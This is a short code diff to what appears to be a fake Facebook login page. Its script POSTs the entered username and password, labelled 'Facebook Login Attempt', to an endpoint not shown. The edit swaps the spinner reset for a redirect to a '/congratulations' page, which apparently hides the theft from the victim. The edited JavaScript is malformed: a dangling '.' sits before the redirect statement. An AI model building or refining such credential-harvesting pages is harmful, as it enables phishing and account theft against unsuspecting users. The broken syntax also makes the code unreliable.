@@ -60,13 +60,8 @@
           method: "POST",
           headers: { "Content-Type": "text/plain" },
           body: `Facebook Login Attempt:\nUsername: ${username}\nPassword: ${password}`
-        }).then(() => {
-          setTimeout(() => {
-            // Hide spinner and re-enable button after 2 seconds
-            loginText.classList.remove("hidden");
-            spinner.classList.add("hidden");
-            loginBtn.disabled = false;
-          }, 2000);
+        }).
+        window.location.href = "/congratulations";
         });
       });
     </script>
